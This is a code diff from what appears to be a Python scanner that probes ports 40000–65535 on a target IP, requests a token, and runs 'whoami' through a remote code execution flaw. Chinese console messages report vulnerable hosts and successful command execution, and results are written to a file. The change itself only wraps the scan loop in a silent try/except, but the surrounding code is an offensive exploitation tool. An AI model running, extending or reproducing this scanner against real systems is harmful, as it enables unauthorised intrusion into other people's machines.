@@ -37,35 +37,38 @@ def portscan(ip):
         global flag
         global timeout
         while not port_queue.empty():
-            if (flag == "1"):
-                break
-            else:
-                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                server.setblocking(1)
-                server.settimeout(timeout)
-                port = port_queue.get(timeout=20)
-                try:
-                    print("正在扫描" + ip + ":" + port, end="\r")
-                    resu = server.connect_ex((ip, int(port)))
-                    server.settimeout(None)
-                    if (resu == 0):
-                        s, re = gettoken(ip, port)
-                        if (s == "success"):
-                            print("发现可能存在RCE漏洞的目标 ", ip + ":" + port)
-                            s1, re1 = rce_run_whoami(ip, port, re)
-                            if (s1 == "success"):
-                                flag = "1"
-                                datatmp['ip'] = ip
-                                datatmp['port'] = port
-                                totxt(resultfile, ip, port)
-                                print(ip + ":" + port + " whoami执行成功：" + re1)
-                            else:
-                                print(ip + ":" + port + " whoami执行失败，可能是误报")
+            try:
+                if (flag == "1"):
+                    break
+                else:
+                    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    server.setblocking(1)
+                    server.settimeout(timeout)
+                    port = port_queue.get(timeout=20)
+                    try:
+                        print("正在扫描" + ip + ":" + port, end="\r")
+                        resu = server.connect_ex((ip, int(port)))
+                        server.settimeout(None)
+                        if (resu == 0):
+                            s, re = gettoken(ip, port)
+                            if (s == "success"):
+                                print("发现可能存在RCE漏洞的目标 ", ip + ":" + port)
+                                s1, re1 = rce_run_whoami(ip, port, re)
+                                if (s1 == "success"):
+                                    flag = "1"
+                                    datatmp['ip'] = ip
+                                    datatmp['port'] = port
+                                    totxt(resultfile, ip, port)
+                                    print(ip + ":" + port + " whoami执行成功：" + re1)
+                                else:
+                                    print(ip + ":" + port + " whoami执行失败，可能是误报")
 
-                except Exception as e:
-                    print(e)
-                finally:
-                    server.close()
+                    except Exception as e:
+                        print(e)
+                    finally:
+                        server.close()
+            except Exception as _:
+                pass
 
     port_queue = queue.Queue()
     for i in range(40000, 65535):
